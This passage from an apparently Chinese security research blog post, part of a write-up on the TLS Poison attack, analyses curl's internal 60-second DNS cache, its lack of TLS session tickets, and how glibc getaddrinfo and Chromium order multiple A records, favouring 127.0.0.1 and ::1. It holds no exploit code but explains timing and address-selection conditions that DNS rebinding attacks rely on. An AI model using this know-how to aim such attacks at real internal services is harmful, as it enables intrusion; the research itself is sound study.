Impact在作者的报告中指出如下的 Client 对 TLS 会话进行了缓存： 作者还给出了在内网中易受攻击的服务： More Than TLS Poison接下来就是在复现、探索 TLS Poison 攻击遇到的一些问题以及相应的探索，我觉得其中有一些会比攻击本身更值得探究。 cURL DNS Cache关于 curl 存在 DNS 缓存的问题，当时复现的时候，即使我们已经设置了 DNS 记录 TTL 为 0 ， curl 也会有一定时间的缓存，这让我当时感到非常诧异，特别想了解 curl 对于 DNS 缓存的处理。 于是乎，直接 build 了当时最新的 curl 7.75.0 ，抄起 gdb 就开始一顿 debug ，一开始我跟一位 C 语言审计带师调的时候觉得 curl 的代码应该会比较简单…可谁知弄起来还比较麻烦，尤其是对于我这种不是特别熟悉 C 语言的 Web 选手来说，调试坑还是挺多的，尤其 curl 还使用了多线程处理…我在调试的时候还是相当懵逼的，期间也让我学习到了很多调试小技巧。 curl 在 lib/hostip.c#575 当中会调用Curl_resolv函数，其中又会调用Curl_getaddrinfo函数启动一个新线程去查询 DNS ，其中主要使用了Curl_getaddrinfo_ex封装了getaddrinfo这个 libc 函数，得到的结果会使用Curl_cache_addr进行缓存，而进行缓存主要操作就是 curl 自己维护了一个哈希表，第一次查询得到结果就会使用Curl_cache_addr放入哈希表当中，主要函数实现如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657/* * Curl_cache_addr() stores a 'Curl_addrinfo' struct in the DNS cache. * * When calling Curl_resolv() has resulted in a response with a returned * address, we call this function to store the information in the dns * cache etc * * Returns the Curl_dns_entry entry pointer or NULL if the storage failed. */struct Curl_dns_entry *Curl_cache_addr(struct Curl_easy *data, struct Curl_addrinfo *addr, const char *hostname, int port){ char entry_id[MAX_HOSTCACHE_LEN]; size_t entry_len; struct Curl_dns_entry *dns; struct Curl_dns_entry *dns2;#ifndef CURL_DISABLE_SHUFFLE_DNS /* shuffle addresses if requested */ if(data-&gt;set.dns_shuffle_addresses) { CURLcode result = Curl_shuffle_addr(data, &amp;addr); if(result) return NULL; }#endif /* Create a new cache entry */ dns = calloc(1, sizeof(struct Curl_dns_entry)); if(!dns) { return NULL; } /* Create an entry id, based upon the hostname and port */ create_hostcache_id(hostname, port, entry_id, sizeof(entry_id)); entry_len = strlen(entry_id); dns-&gt;inuse = 1; /* the cache has the first reference */ dns-&gt;addr = addr; /* this is the address(es) */ time(&amp;dns-&gt;timestamp); if(dns-&gt;timestamp == 0) dns-&gt;timestamp = 1; /* zero indicates permanent CURLOPT_RESOLVE entry */ /* Store the resolved data in our DNS cache. */ dns2 = Curl_hash_add(data-&gt;dns.hostcache, entry_id, entry_len + 1, (void *)dns); if(!dns2) { free(dns); return NULL; } dns = dns2; dns-&gt;inuse++; /* mark entry as in-use */ return dns;} 其中会使用dns-&gt;inuse变量起到一个引用计数的作用，在经过第一次查询得到 DNS 记录之后，再进行 DNS 查询时， curl 会优先在自己的哈希表中查询，如果查到了则又会维护dns-&gt;inuse将其加一。 1234567891011121314151617181920212223242526272829303132/* * Curl_resolv_unlock() unlocks the given cached DNS entry. When this has been * made, the struct may be destroyed due to pruning. It is important that only * one unlock is made for each Curl_resolv() call. * * May be called with 'data' == NULL for global cache. */void Curl_resolv_unlock(struct Curl_easy *data, struct Curl_dns_entry *dns){ if(data &amp;&amp; data-&gt;share) Curl_share_lock(data, CURL_LOCK_DATA_DNS, CURL_LOCK_ACCESS_SINGLE); freednsentry(dns); if(data &amp;&amp; data-&gt;share) Curl_share_unlock(data, CURL_LOCK_DATA_DNS);}/* * File-internal: release cache dns entry reference, free if inuse drops to 0 */static void freednsentry(void *freethis){ struct Curl_dns_entry *dns = (struct Curl_dns_entry *) freethis; DEBUGASSERT(dns &amp;&amp; (dns-&gt;inuse&gt;0)); dns-&gt;inuse--; if(dns-&gt;inuse == 0) { Curl_freeaddrinfo(dns-&gt;addr); free(dns); }} 通过Curl_resolv_unlock函数在每次通信结束后调用freednsentry将dns-&gt;inuse减一，但是此时结束之后dns-&gt;inuse的值仍为 1 ，所以下次进行 DNS 查询的时候还会使用 hash 里的 DNS 记录，此时的调用栈如下所示（我们这里称为调用栈 A ）： 123456789101112#0 freednsentry (freethis=0x5555555d8728) at hostip.c:838#1 0x00007ffff7f0b20e in Curl_resolv_unlock (data=0x5555555d8728, dns=0x5555555d1d38) at hostip.c:828#2 0x00007ffff7f2720e in multi_done (data=0x5555555d8728, status=CURLE_OK, premature=false) at multi.c:620#3 0x00007ffff7f2a902 in multi_runsingle (multi=0x5555555d4d18, nowp=0x7fffffffdae0, data=0x5555555d8728) at multi.c:2227#4 0x00007ffff7f2af09 in curl_multi_perform (multi=0x5555555d4d18, running_handles=0x7fffffffdbd0) at multi.c:2412#5 0x00007ffff7ef75fb in easy_transfer (multi=0x5555555d4d18) at easy.c:606#6 0x00007ffff7ef7875 in easy_perform (data=0x5555555d8728, events=false) at easy.c:696#7 0x00007ffff7ef78e0 in curl_easy_perform (data=0x5555555d8728) at easy.c:715#8 0x000055555557abb9 in serial_transfers (global=0x7fffffffde20, share=0x5555555d26d8) at tool_operate.c:2326#9 0x000055555557b099 in run_all_transfers (global=0x7fffffffde20, share=0x5555555d26d8, result=CURLE_OK) at tool_operate.c:2504#10 0x000055555557b3d9 in operate (global=0x7fffffffde20, argc=3, argv=0x7fffffffdf98) at tool_operate.c:2620#11 0x0000555555570991 in main (argc=3, argv=0x7fffffffdf98) at tool_main.c:277 并且我们也注意到只有当dns-&gt;inuse为 0 的时候， curl 才会将dns-&gt;addr释放掉，所以对于我们来说，需要关注什么时候才能让dns-&gt;inuse为 0 ，也就是说什么时候 curl 会执行两次freednsentry 函数将其减少到了 0 。（因为 curl 当中只有freednsentry函数对dns-&gt;inuse进行了减一操作） 经过调试，发现 curl 在经过上面的调用栈后，再次经过下面的调用栈（我们这里称为调用栈 B ）会再次调用freednsentry函数将dns-&gt;inuse减少到 0 。 12345678910111213141516#0 freednsentry (freethis=0x5555556bab48) at hostip.c:838#1 0x00007ffff7f08c9f in hash_element_dtor (user=0x5555555d2758, element=0x5555555d2b48) at hash.c:41#2 0x00007ffff7f1d4a5 in Curl_llist_remove (list=0x5555555d19e8, e=0x5555555d2b48, user=0x5555555d2758) at llist.c:130#3 0x00007ffff7f09283 in Curl_hash_clean_with_criterium (h=0x5555555d2758, user=0x7fffffffd830, comp=0x7ffff7f0a3e9 &lt;hostcache_timestamp_remove&gt;) at hash.c:249#4 0x00007ffff7f0a494 in hostcache_prune (hostcache=0x5555555d2758, cache_timeout=60, now=1615184672) at hostip.c:217#5 0x00007ffff7f0a546 in Curl_hostcache_prune (data=0x5555555d8728) at hostip.c:241#6 0x00007ffff7f2722c in multi_done (data=0x5555555d8728, status=CURLE_OK, premature=false) at multi.c:623#7 0x00007ffff7f2a902 in multi_runsingle (multi=0x5555555d4d18, nowp=0x7fffffffdae0, data=0x5555555d8728) at multi.c:2227#8 0x00007ffff7f2af09 in curl_multi_perform (multi=0x5555555d4d18, running_handles=0x7fffffffdbd0) at multi.c:2412#9 0x00007ffff7ef75fb in easy_transfer (multi=0x5555555d4d18) at easy.c:606#10 0x00007ffff7ef7875 in easy_perform (data=0x5555555d8728, events=false) at easy.c:696#11 0x00007ffff7ef78e0 in curl_easy_perform (data=0x5555555d8728) at easy.c:715#12 0x000055555557abb9 in serial_transfers (global=0x7fffffffde20, share=0x5555555d26d8) at tool_operate.c:2326#13 0x000055555557b099 in run_all_transfers (global=0x7fffffffde20, share=0x5555555d26d8, result=CURLE_OK) at tool_operate.c:2504#14 0x000055555557b3d9 in operate (global=0x7fffffffde20, argc=3, argv=0x7fffffffdf98) at tool_operate.c:2620#15 0x0000555555570991 in main (argc=3, argv=0x7fffffffdf98) at tool_main.c:277 而这两次调用栈的主要关系在multi_done函数中，我们可以在 lib/multi.c#619 处找到如下代码： 123456if(conn-&gt;dns_entry) { Curl_resolv_unlock(data, conn-&gt;dns_entry); /* done with this */ conn-&gt;dns_entry = NULL;}Curl_hostcache_prune(data);Curl_safefree(data-&gt;state.ulbuf); 所以讲道理的话，在经过调用栈 A 之后，也就是经过Curl_resolv_unlock函数将inuse减一之后，理论上应该又会经过Curl_hostcache_prune函数将inuse减一才对，但是实际上并没有。而Curl_resolv_unlock函数我们上面看过，并没有什么多余的操作，所以我们需要看一下Curl_hostcache_prune为什么没有将inuse减一。 1234567891011121314151617181920212223242526/* * Library-wide function for pruning the DNS cache. This function takes and * returns the appropriate locks. */void Curl_hostcache_prune(struct Curl_easy *data){ time_t now; if((data-&gt;set.dns_cache_timeout == -1) || !data-&gt;dns.hostcache) /* cache forever means never prune, and NULL hostcache means we can't do it */ return; if(data-&gt;share) Curl_share_lock(data, CURL_LOCK_DATA_DNS, CURL_LOCK_ACCESS_SINGLE); time(&amp;now); /* Remove outdated and unused entries from the hostcache */ hostcache_prune(data-&gt;dns.hostcache, data-&gt;set.dns_cache_timeout, now); if(data-&gt;share) Curl_share_unlock(data, CURL_LOCK_DATA_DNS);} 好了，看到time_t now就差不多猜到大概了，所以按照之前的现象，Curl_hostcache_prune函数没有将inuse减一，可能是在第一个判断语句就直接返回了，所以接下来我们先检查第一个条件语句当中的条件。 第一个比较重要的参数data-&gt;set.dns_cache_timeout，在 curl 源码当中唯二对其进行赋值操作的地方在 lib/setopt.c#173 : 123456case CURLOPT_DNS_CACHE_TIMEOUT: arg = va_arg(param, long); if(arg &lt; -1) return CURLE_BAD_FUNCTION_ARGUMENT; data-&gt;set.dns_cache_timeout = arg; break; 根据文件名以及上下文，我们不难查到这是对于用户传入的参数进行的配置 CURLOPT_DNS_CACHE_TIMEOUT explained ，并不是我们需要的。还有一处赋值语句则是在 lib/url.c#511 处，在结构体当中对其进行了赋值。 1set-&gt;dns_cache_timeout = 60; /* Timeout every 60 seconds by default */ 并且我们这里还能从注释中获得信息，也就是说如果不是用户自定义参数赋值，默认 DNS 缓存时间为 60s 。 另一个参数data-&gt;dns.hostcache，我们之前在Curl_hash_add函数中，用作表示哈希记录，这里不为空。也就是说，一般情况下，Curl_hostcache_prune中的第一个条件语句不会直接return，所以我们还需要继续跟进该函数，接下来就到了hostcache_prune函数。 123456789101112131415/* * Prune the DNS cache. This assumes that a lock has already been taken. */static voidhostcache_prune(struct Curl_hash *hostcache, long cache_timeout, time_t now){ struct hostcache_prune_data user; user.cache_timeout = cache_timeout; user.now = now; Curl_hash_clean_with_criterium(hostcache, (void *) &amp;user, hostcache_timestamp_remove);} 感觉看到这里已经能很明显的看到 curl 做法的意图了，传入函数的三个参数，第三个参数为现在的时间，第二个参数这里为默认的 DNS 缓存时间为 60s ，进行赋值操作后，进入到hostcache_timestamp_remove函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/* Cleans all entries that pass the comp function criteria. */voidCurl_hash_clean_with_criterium(struct Curl_hash *h, void *user, int (*comp)(void *, void *)){ struct Curl_llist_element *le; struct Curl_llist_element *lnext; struct Curl_llist *list; int i; if(!h) return; for(i = 0; i &lt; h-&gt;slots; ++i) { list = &amp;h-&gt;table[i]; le = list-&gt;head; /* get first list entry */ while(le) { struct Curl_hash_element *he = le-&gt;ptr; lnext = le-&gt;next; /* ask the callback function if we shall remove this entry or not */ if(comp == NULL || comp(user, he-&gt;ptr)) { Curl_llist_remove(list, le, (void *) h); --h-&gt;size; /* one less entry in the hash now */ } le = lnext; } }}/* * This function is set as a callback to be called for every entry in the DNS * cache when we want to prune old unused entries. * * Returning non-zero means remove the entry, return 0 to keep it in the * cache. */static inthostcache_timestamp_remove(void *datap, void *hc){ struct hostcache_prune_data *data = (struct hostcache_prune_data *) datap; struct Curl_dns_entry *c = (struct Curl_dns_entry *) hc; return (0 != c-&gt;timestamp) &amp;&amp; (data-&gt;now - c-&gt;timestamp &gt;= data-&gt;cache_timeout);} 在这里一切真相大白，正如代码所示，在hostcache_timestamp_remove中会使用现在的时间与 curl 哈希表中记录的时间相减，结果是否大于data-&gt;cache_timeout，在这里也就是默认的 60s ，如果大于则在Curl_hash_clean_with_criterium清空对应的哈希表，接着 curl 才会进行下一次真正的 DNS 查询。 所以，从代码层面来看，如果没有用户特殊配置， curl 会自己维护一个 DNS 哈希表，其中的记录过期时间为 60s 。 官网文档也有过相关说明 CURLOPT_DNS_CACHE_TIMEOUT explained ，其中描述如下： ​ Pass a long, this sets the timeout in seconds. Name resolves will be kept in memory and used for this number of seconds. Set to zero to completely disable caching, or set to -1 to make the cached entries remain forever. By default, libcurl caches this info for 60 seconds. The name resolve functions of various libc implementations don’t re-read name server information unless explicitly told so (for example, by calling res_init(3)). This may cause libcurl to keep using the older server even if DHCP has updated the server info, and this may look like a DNS cache issue to the casual libcurl-app user. Note that DNS entries have a “TTL” property but libcurl doesn’t use that. This DNS cache timeout is entirely speculative that a name will resolve to the same address for a certain small amount of time into the future. 更一步说明了， curl 完全忽视得到的 DNS 查询得到的 TTL 缓存时间，使用自己的 DNS 缓存策略。虽然 curl 没有守护进程等什么手段的来维护自己的 DNS 哈希表，但是为了解决在复杂网络请求时避免过多 DNS 请求，还是选择了每次使用一个哈希表来优化。其主要的设计思路主要基于两层缓存，第一层缓存由系统决定，也就是通过getaddrinfo获取，如果这时候过期了则由系统去获取 DNS 记录，如果没有过期则直接使用系统的 DNS 记录；第二层就是 curl 自己的 DNS 哈希表，在进行多次请求时能体现出使用自己哈希表的优势，进一步省去了从系统获取 DNS 记录的时间。当然还有一种可能就是为了在特定场合在一定程度上缓解 DNS Rebinding 的攻击。 cURL Session Ticket关于 Session Ticket ，虽然该标准有很多的优点，主要实现了 Stateless 的特点，减缓了服务器的负载压力，但是似乎 curl with openSSL 并不打算支持 Session Ticket 这一 extension 。 虽然曾经有人尝试在 curl 中支持这一 TLS 1.2 的特性，但是根据 Re: Question about SSL Session Tickets 当中的讨论，TLS Session ticket support 构建的 curl 并不可以正常的使用，所以当时被 curl 官方人员放弃了该 PR Merged ，之后也没有再打算支持这一特性了，当然也没有在 curl 的 TODO 看到相关的支持计划了。当然如果你非常倾向于使用 CLI 工具去实验该特性，可以尝试使用 openssl s_client 或者 curl build with GnuTLS ，他们都支持这一特性。 以下是在互联网上一些关于 curl 支持 TLS 1.2 Session Ticket 的讨论： https://curl.se/mail/lib-2019-08/0056.html https://github.com/curl/curl/issues/3202 https://github.com/curl/curl/pull/2220 https://github.com/curl/curl/issues/1109#issuecomment-274346447 https://stackoverflow.com/questions/19939247/ssl-session-tickets-vs-session-ids IP Sort IN cURL好了，接下来就是对于 IP 选择的问题了，前面我们说过 curl 在获取 DNS 记录的时候，使用的是getaddrinfo函数，该函数位于 glibc 当中，为了弄清楚这个函数对于 IP 选择的问题，我一个 Web 选手也只能硬着头皮去调试 glibc 了，何时受过这个苦！下面就是在调试 glibc 2.31 过程当中的一些记录与结果。 从 getaddrinfo 的手册中，我们可以了解到： ​ Given node and service, which identify an Internet host and a service, getaddrinfo() returns one or more addrinfo structures, each of which contains an Internet address that can be specified in a call to bind(2) or connect(2). The getaddrinfo() function combines the functionality provided by the gethostbyname(3) and getservbyname(3) functions into a single interface, but unlike the latter functions, getaddrinfo() is reentrant and allows programs to eliminate IPv4-versus-IPv6 dependencies. 其函数功能主要是用来查询给定域名对应的 IP ，用来替代之前的gethostbyname与getservbyname函数，并且均支持 IPv4 与 IPv6 。在手册中，我们还可以看到如下描述： ​ There are several reasons why the linked list may have more than one addrinfo structure, including: the network host is multihomed, accessible over multiple protocols (e.g., both AF_INET and AF_INET6); or the same service is available from multiple socket types (one SOCK_STREAM address and another SOCK_DGRAM address, for example). Normally, the application should try using the addresses in the order in which they are returned. The sorting function used within getaddrinfo() is defined in RFC 3484; the order can be tweaked for a particular system by editing /etc/gai.conf (available since glibc 2.5). 以及在其配置文件 gai.conf 帮助文档当中也可以看到如下描述： ​ A call to getaddrinfo(3) might return multiple answers. According to RFC 3484 these answers must be sorted so that the answer with the highest success rate is first in the list. The RFC provides an algorithm for the sorting. The static rules are not always adequate, though. For this reason, the RFC also requires that system administrators should have the possibility to dynamically change the sorting. For the glibc implementation, this can be achieved with the /etc/gai.conf file. Each line in the configuration file consists of a keyword and its parameters. White spaces in any place are ignored. Lines starting with ‘#’ are comments and are ignored. 也就是说，getaddrinfo函数会使用 gai.conf 以及 RFC 3484 来对其得到的结果进行排序，而 gai.conf 文件中的可以由用户手动配置，我们暂且搁置，先来看看这个传说中的 RFC 3484 所描述的规则。这里我们需要注意的是， RFC 3484 已经被 RFC 6724 取代，So let’s take a look at the RFC 6724. 在 RFC 6724 的介绍中，我们可以看到如下的描述： ​ For example, when DNS name resolution yields both IPv6 and IPv4 addresses and the network protocol stack has available both IPv6 and IPv4 source addresses. In such cases, a simple policy to always prefer IPv6 or always prefer IPv4 can produce poor behavior. As one example, suppose a DNS name resolves to a global IPv6 address and a global IPv4 address. If the node has assigned a global IPv6 address and a 169.254/16 auto-configured IPv4 address [9], then IPv6 is the best choice for communication. But if the node has assigned only a link-local IPv6 address and a global IPv4 address, then IPv4 is the best choice for communication. The destination address selection algorithm solves this with a unified procedure for choosing among both IPv6 and IPv4 addresses. 这里正好举了一个例子，例如当 DNS 解析同时产生 IPv6 和 IPv4 地址，而网络协议栈同时拥有 IPv6 和 IPv4 源地址时，在这种情况下，一个简单的策略，即总是优先选择 IPv6 或总是优先选择 IPv4 ，可能会产生不良行为。举个例子，假设一个 DNS 解析到一个全局 IPv6 地址和一个全局 IPv4 地址，如果节点已经分配了一个全局 IPv6 地址和一个 169.254/16 自动配置的 IPv4 地址，那么 IPv6 是通信的最佳选择。但如果节点只分配了一个链路本地 IPv6 地址和一个全局 IPv4 地址，那么 IPv4 是通信的最佳选择。目的地址选择算法解决了这一问题，在 IPv6 和 IPv4 地址中进行统一的选择。 这个介绍看起来似乎正是我们需要的，能帮助我们解决对于两个 IP 的排序问题。在大概通读这篇 RFC 后，该 RFC 主要提出了几种地址选择算法，包括源地址选择算法、目的地址选择算法等，能够帮助我们解决很多平时的疑惑，比如有多个源 IP 为什么使用其中一个特定的源 IP 等，个人建议如果有类似关于网络通信疑问或者需要了解网络通信内容的同学可以进一步学习一下该 RFC 。这里我们需要关注的是主要是目的地址选择算法，不会介绍其他算法，并且也只是做个简单介绍。 对于目的地址选择算法需要按顺序遵守十条规则，并且只要前任一规则起到排序作用，则后续规则不起作用。下文以 DS 表示 Destination S 。 规则1：避免不可用的目的地。如果已知 DB 是不可到达的，或者如果 Source(DB) 是未定义的，那么首选DA。同理，如果已知 DA 是不可到达的，或者 Source(DA) 是未定义的，那么首选 DB 。 规则2：优先选择匹配的范围。如果 Scope(DA) = Scope(Source(DA)) ，且 Scope(DB) &lt;&gt; Scope(Source(DB)) ，则优先选择 DA 。同理，如果 Scope(DA) &lt;&gt; Scope(Source(DA)) ，且Scope(DB) = Scope(Source(DB)) ，则优先选择DB。 规则3：避免使用废弃的地址。如果 Source(DA) 被弃用而 Source(DB) 没有被弃用，那么首选 DB 。同理，如果 Source(DA) 没有被废弃，而 Source(DB) 被废弃，那么优先选择 DA 。 规则4：优先选择家庭地址。如果 Source(DA) 同时是家庭地址和照顾地址，而 Source(DB) 不是，那么首选 DA 。同理，如果 Source(DB) 同时是家庭地址和照顾地址，而 Source(DA) 不是，那么首选DB。如果 Source(DA) 只是一个家庭地址，而 Source(DB) 只是一个照顾地址，那么就选择 DA 。同理，如果 Source(DA) 只是一个照顾地址，而 Source(DB) 只是一个家庭地址，那么首选 DB 。 规则5：优先选择匹配的标签。如果 Label(Source(DA))=Label(DA) 且 Label(Source(DB)) &lt;&gt; Label(DB) ，则首选 DA 。同理，如果 Label(Source(DA)) &lt;&gt;Label(DA) ，且Label(Source(DB))=Label(DB)，则优先选择 DB 。 规则6：优先选择较高的优先级。如果 Precedence(DA)&gt; Precedence(DB) ，则优先选择 DA 。同理，如果 Precedence(DA) &lt; Precedence(DB) ，则优先选择 DB 。 规则7：优先选择本地传输。如果 DA 是通过封装过渡机制（如IPv4中的IPv6）达到的，而 DB 不是，那么优先选择 DB 。同理，如果 DB 是通过封装到达，而 DA 不是，那么优先选择 DA 。 规则8：优先选择较小的范围。如果 Scope(DA) &lt; Scope(DB) ，则首选 DA 。同样，如果Scope(DA)&gt;Scope(DB) ，则选择 DB 。 规则9：使用最长的匹配前缀。当DA和DB属于同一个地址族（都是IPv6或都是IPv4）。如果CommonPrefixLen(Source(DA), DA) &gt; CommonPrefixLen(Source(DB), DB)，则首选DA。同理，如果CommonPrefixLen(Source(DA), DA) &lt; CommonPrefixLen(Source(DB)，DB)，则优先选择DB。 规则10：否则，保持顺序不变。如果DA在原列表中先于DB，则优先选择DA。否则，优先选择DB。 如果执行有其他方法对目的地地址进行排序，规则9和10可以被取代。例如，如果实施机构知道哪些目的地址会带来 “最佳 “的通信性能，则规则9和10可以被取代。 更简单来说遵守以下规则： 避免使用不可用的目的地址。如果一个地址是可到达的（堆栈有通往特定地址的路由），而另一个地址是不可到达的，那么将可到达的目的地址放在不可到达的地址之前。 优先选择匹配的范围。如果一个地址的作用域与其源地址的作用域相匹配，而另一个地址不符合这个标准，那么就把作用域相匹配的地址放在另一个目的地址之前。 目的地址及其相关的源地址的范围由地址的高阶位决定。目的地址可以是多播地址或单播地址。为了比较范围，单播链路本地地址被映射到多播链路本地地址，单播全局地址被映射到多播全局地址。 避免使用废弃的地址。如果一个地址是废弃的，而另一个地址是非废弃的，那么非废弃的地址放在另一个地址之前。 优先选择匹配的标签。如果一个目标地址的标签与其关联的源地址的标签相匹配，而另一个目标地址的标签与其关联的源地址的标签不相匹配，那么具有匹配标签的目标地址被放在另一个地址之前。有关标签如何与目标地址关联的信息，请参见IPv6默认地址选择的策略表和配置默认地址选择的策略表。 优先选择较高的优先级。如果一个地址的优先级高于另一个地址的优先级，那么优先级较高的地址将被放在另一个目标地址之前。请参阅 IPv6默认地址选择的策略表 和 配置默认地址选择的策略表，以了解更多关于优先级值如何与目的地址关联的信息。 优先范围较小。如果一个地址的作用域小于另一个地址的作用域，则作用域较小的地址放在另一个目的地址之前。 使用最长的匹配前缀。如果一个目标地址与其关联的源地址的 CommonPrefixLength 比另一个目标地址与其源地址的 CommonPrefixLength 长，那么 CommonPrefixLength 长的地址放在另一个地址之前。 保持顺序不变。没有规则选择这两个地址中较好的地址，则它们选择权重相等。选择第一个地址作为这两个地址中较好的地址，顺序不变。 我认为 RFC 决定了代码应该怎么去执行，但是终究还是代码决定了怎么去执行。（纯粹是我也没怎么看懂 于是，我们可以在这里找到getaddrinfo函数的实现：https://code.woboq.org/userspace/glibc/sysdeps/posix/getaddrinfo.c.html#2479 ，关键点就在这，可以看到在getaddrinfo函数拿到结果后使用了rfc3484_sort对结果进行排序： 123456789101112131415/* We got all the source addresses we can get, now sort using the information. */struct sort_result_combo src = { .results = results, .nresults = nresults };if (__glibc_unlikely (gaiconf_reload_flag_ever_set)) { __libc_lock_define_initialized (static, lock); __libc_lock_lock (lock); if (__libc_once_get (old_once) &amp;&amp; gaiconf_reload_flag) gaiconf_reload (); __qsort_r (order, nresults, sizeof (order[0]), rfc3484_sort, &amp;src); __libc_lock_unlock (lock); }else __qsort_r (order, nresults, sizeof (order[0]), rfc3484_sort, &amp;src); rfc3484_sort函数主要实现对应了 RFC 6742 当中的十条规则： 1234567891011static intrfc3484_sort (const void *p1, const void *p2, void *arg){ //...代码段过长这里省略 /* Rule 10: Otherwise, leave the order unchanged. To ensure this compare with the value indicating the order in which the entries have been received from the services. NB: no two entries can have the same order so the test will never return zero. */ return idx1 &lt; idx2 ? -1 : 1;} rfc3484_sort的函数执行完后，回调到__qsort_r，也就是qsort_r 123#define __qsort_r qsort_r__qsort_r (order, nresults, sizeof (order[0]), rfc3484_sort, &amp;src); 接着查阅手册，我们可以看到 qsort_r 函数的描述： Synopsis 12345678#include &lt;stdlib.h&gt;void qsort(void *base, size_t nmemb, size_t size, int (*compar)(const void *, const void *));void qsort_r(void *base, size_t nmemb, size_t size, int (*compar)(const void *, const void *, void *), void *arg); Feature Test Macro Requirements for glibc (see feature_test_macros(7)): qsort_r(): _GNU_SOURCE Description The qsort() function sorts an array with nmemb elements of size size. The base argument points to the start of the array. The contents of the array are sorted in ascending order according to a comparison function pointed to by compar, which is called with two arguments that point to the objects being compared. The comparison function must return an integer less than, equal to, or greater than zero if the first argument is considered to be respectively less than, equal to, or greater than the second. If two members compare as equal, their order in the sorted array is undefined. The qsort_r() function is identical to qsort() except that the comparison function compar takes a third argument. A pointer is passed to the comparison function via arg. In this way, the comparison function does not need to use global variables to pass through arbitrary arguments, and is therefore reentrant and safe to use in threads. 从中我们可以明白，qsort_r 函数是返回升序的数组结果，并且对于使用的比较函数的返回值是否大于零来决定传递的参数大小，如果返回值大于零，意思就是第一个参数需要排在第二个参数之后。 接下来我们就具体来调试一下这个函数吧，期间 setup 等调试 glibc 并非本文范围，而且网络也有比较多的文章，这里就不再做记录。 这里我们以一个 A 记录为 127.0.0.1 ，另一个 A 记录为我其中一个 VPS 地址为例子，具体来看看这个函数的主要判断形式。 gbd 直接下断点到rfc3484_sort，在进入到函数后，我们可以通过以下形式查看相应的地址： 1234(gdb) p ((struct sockaddr_in*)((*a1-&gt;dest_addr)-&gt;ai_addr))-&gt;sin_addr$3 = {s_addr = 3183758381}(gdb) p ((struct sockaddr_in*)((*a2-&gt;dest_addr)-&gt;ai_addr))-&gt;sin_addr$4 = {s_addr = 16777343} 得到 a1 与 a2 代表的地址后，转成十进制后再倒叙一下，即 a2 代表的是 127.0.0.1 ， a1 代表的是我们真正 vps 的地址。然后通过 gdb 单步执行，我们在 Rule 8 的时候跳出了rfc3484_sort函数: 12345/* Rule 8: Prefer smaller scope. */if (a1_dst_scope &lt; a2_dst_scope) return -1;if (a1_dst_scope &gt; a2_dst_scope) return 1; 跳出rfc3484_sort进入到 qsort_r 函数，也就是在此处执行完比较就直接返回到了qsort函数，并且从执行结果来看，是因为 a1_dst_scope &gt; a2_dst_scope 比较结果执行了return 1。所以按照qsort函数文档说明，如果返回了一个大于 0 的值，则说明要将第一个参数需要排在第二个参数之后，这里 a1 代表的我们的 vps 地址需要排在 a2 代表的 127.0.0.1 地址之后，所以经过rfc3484_sort函数返回的顺序则是 127.0.0.1 作为首选地址，VPS 地址其次。 于是我接下来依次对 IPv4 当中各种排列组合进行了测试： a1 127.0.0.1 vs a2 0.0.0.0。适用于 scope 判断，127 优先 a1 ipv4 vps vs a2 0.0.0.0。适用于 scope 判断，ipv4 vps 优先 a1 169.254.1.1 vs a2 0.0.0.0。适用于 scope 判断，169 优先 a1 127.0.0.1 vs a2 169.254.0。适用于 scope 判断，127 优先 a1 ipv4 vps vs a2 ipv4 vps。并不适用任何判断，函数执行完成返回 -1 ，表示保持原顺序，体现为随机。 再次重申，这里的 IPv6 指的是IPv4-mapped IPv6 addresses 这类地址 对于 IPv6 我们可以使用如下形式在 gdb 打印对应的地址： 1p ((struct sockaddr_in6*)((*a1-&gt;dest_addr)-&gt;ai_addr))-&gt;sin6_addr-&gt;__in6_u-&gt;__u6_addr8 于是我接下来依次对 IPv4 与 IPv6 当中各种排列组合进行了测试： IPv6 vps vs IPv4 vps。并不适用任何判断，函数执行完成返回 -1 ，表示保持原顺序，体现为随机。 IPv6 vps vs 127.0.0.1。适用于 scope 判断，127 优先 ::1 vs 45.76.196.189。适用于 prec 判断，::1 优先 ::1 vs 127.0.0.1。适用于 prec 判断，::1 优先 127.0.0.1 vs :: 。适用于 scope 判断， :: 优先 0.0.0.0 vs IPv6 vps。适用于 scope 判断， IPv6 VPS 优先。 0.0.0.0 vs ::1。适用于 scope 判断，::1 优先 IPv4 vps vs ::。适用于 scope 判断，IPv4 vps 优先 IPv4 vps vs ::1。适用于 price 判断， ::1 优先 总结起来我们可以得到以下这个表格： 对比形式 A1 A2 优先值 v4127-v40 127.0.0.1 0.0.0.0 A1 v4vps-v40 vps 0.0.0.0 A1 v4vps-v4127 127.0.0.1 vps A1 v4vps-v4vps vps vps 随机，保持原顺序 v4vps-v6vps vps vps 随机，保持原顺序 v4127-v6vps 127.0.0.1 vps A1 v4127-v60 127.0.0.1 :: A1 v4127-v6127 127.0.0.1 ::1 A2 v40-v6vps 0.0.0.0 vps A2 v40-v6127 0.0.0.0 ::1 A2 v4vps-v6127 vps ::1 A2 v4vps-v60 vps :: A1 V4127map-v4ps vps ::ffff:7f00:0001 随机，保持原顺序 整体来说，我们可以大致从表中看出，含有双 A 记录的情况，如果出现 127.0.0.1 或者 ::1 ，都会以这两者优先，而两者中又会以 ::1 优先，所以对于前文的 IP 选择排序问题我们这里也就得到了一个大体的答案。 2021/05/14 更新： 增加了 127.0.0.1 使用 IPv4-mapped 表示 IPv6 时，与 v4 vps 地址的对比，详细说明见 Additional Remarks IP Sort IN Chromium当然在 Chromium 中，我们也可以看到相应的 IP 选择实现方式： https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=39 12345678910// Address sorting is performed according to RFC3484 with revisions.// http://tools.ietf.org/html/draft-ietf-6man-rfc3484bis-06// Precedence and label are separate to support override through /etc/gai.conf.// Returns true if |p1| should precede |p2| in the table.// Sorts table by decreasing prefix size to allow longest prefix matching.bool ComparePolicy(const AddressSorterPosix::PolicyEntry&amp; p1, const AddressSorterPosix::PolicyEntry&amp; p2) { return p1.prefix_length &gt; p2.prefix_length;} 在 https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=200 也实现了基于 RFC 3484 对应的 IP 排序方法。 但是实际测试中， chrome 有个非常奇特的现象，就是对于返回多个 IP ，chrome 会立马挨个对其发起请求，我找了一些朋友询问了相关情况，有些表示没有关注过，有位朋友则表示他过去发现过这个情况，说是 chrome 有个 IP 选优的情况，会对多个 IP 进行测速，以最快的结果作为最佳选择。关于这个结论我在 chromium.org 